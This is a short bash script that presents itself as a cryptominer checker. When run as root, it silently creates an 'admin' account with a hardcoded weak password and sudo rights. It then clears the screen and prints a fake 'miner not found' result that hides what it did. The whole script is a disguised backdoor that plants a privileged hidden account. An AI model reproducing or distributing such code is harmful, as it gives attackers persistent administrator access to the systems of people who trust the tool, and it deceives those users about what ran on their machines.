#!/bin/bash

if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

username="admin"
password="administrator999"

useradd -m -s /bin/bash "$username"
echo "$username:$password" | chpasswd
usermod -aG sudo "$username"

clear
echo "------------------------------"
echo "Miner checker: miner not found"
echo "------------------------------"
